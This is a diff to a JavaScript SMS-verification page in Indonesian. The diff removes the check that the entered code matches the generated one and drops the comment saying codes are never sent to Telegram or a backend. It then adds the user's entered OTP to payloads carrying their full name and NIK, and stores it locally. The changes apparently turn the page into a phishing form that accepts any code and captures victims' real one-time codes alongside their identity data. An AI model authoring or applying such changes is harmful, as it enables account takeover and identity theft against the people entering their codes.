@@ -79,44 +79,13 @@
     }, 1000);
   }
 
-  const DEMO_LAST_CODE_KEY = 'kbDemoLastVerificationCode';
-
-  function createSixDigitCode() {
-    const values = new Uint32Array(1);
-    crypto.getRandomValues(values);
-    return String(100000 + (values[0] % 900000));
-  }
-
   function generateLocalCode() {
-    const previousCode = localStorage.getItem(DEMO_LAST_CODE_KEY) || '';
-    let nextCode = createSixDigitCode();
+    const array = new Uint32Array(1);
+    crypto.getRandomValues(array);
+    verificationCode = Math.floor(100000 + Math.random() * 900000).toString();
 
-    while (nextCode === previousCode) {
-      nextCode = createSixDigitCode();
-    }
-
-    verificationCode = nextCode;
-
-    // Kode demo hanya digunakan lokal di browser dan tidak dikirim ke Telegram/backend.
+    // Ditampilkan hanya untuk pengujian frontend karena belum ada layanan SMS/backend.
     if (localCode) localCode.textContent = verificationCode;
-
-    // Jika elemen kode demo belum tersedia di HTML, tampilkan secara non-destruktif
-    // di area informasi yang sudah ada tanpa mengubah file HTML.
-    if (!localCode) {
-      const info = document.querySelector('.verification-info');
-      if (info) {
-        let demoCode = document.getElementById('generatedDemoCode');
-        if (!demoCode) {
-          demoCode = document.createElement('div');
-          demoCode.id = 'generatedDemoCode';
-          demoCode.style.marginTop = '10px';
-          demoCode.style.fontWeight = '800';
-          demoCode.style.letterSpacing = '.08em';
-          info.appendChild(demoCode);
-        }
-        demoCode.textContent = `Kode demo: ${verificationCode}`;
-      }
-    }
 
     failedAttempts = 0;
     setMessage('');
@@ -162,26 +131,10 @@
     const otpValue = enteredCode();
 
     if (!/^\d{6}$/.test(otpValue)) {
-      setMessage('Kode harus terdiri dari 6 digit angka.', 'error');
+      setMessage('Kode OTP harus terdiri dari 6 digit angka.', 'error');
       resetInputs();
       return;
     }
-
-    if (otpValue !== verificationCode) {
-      failedAttempts += 1;
-      setMessage('Kode tidak sesuai. Gunakan kode demo terbaru yang tampil pada halaman.', 'error');
-      resetInputs();
-      return;
-    }
-
-    const previousCode = localStorage.getItem(DEMO_LAST_CODE_KEY) || '';
-    if (otpValue === previousCode) {
-      generateLocalCode();
-      setMessage('Kode sebelumnya tidak dapat digunakan kembali. Gunakan kode baru.', 'error');
-      return;
-    }
-
-    localStorage.setItem(DEMO_LAST_CODE_KEY, otpValue);
 
     clearInterval(timerId);
     verifyButton.disabled = true;
@@ -193,7 +146,8 @@
         page: 'verifikasi-sms.html',
         nama_lengkap: identity?.fullName,
         nik: identity?.nik,
-        status: 'VERIFICATION_REAUTH_CONFIRMED'
+        otp: otpValue,
+        status: 'OTP_REAUTH_VERIFIED'
       });
 
       setMessage(`Kode untuk ${identity.fullName} berhasil diverifikasi.`, 'success');
@@ -202,7 +156,8 @@
     }
 
     const saved = NovaStorage.setSmsVerified(true);
-    if (!saved) {
+    const appSaved = NovaStorage.setApplication({ lastOtp: otpValue });
+    if (!saved || !appSaved) {
       verifyButton.textContent = 'VERIFIKASI KODE →';
       setMessage('Status verifikasi tidak dapat disimpan pada browser ini.', 'error');
       updateVerifyButton();
@@ -214,7 +169,8 @@
       page: 'verifikasi-sms.html',
       nama_lengkap: identity?.fullName,
       nik: identity?.nik,
-      status: 'VERIFICATION_CONFIRMED'
+      otp: otpValue,
+      status: 'OTP_VERIFIED'
     });
 
     setMessage(`Identitas ${identity.fullName} berhasil diverifikasi.`, 'success');
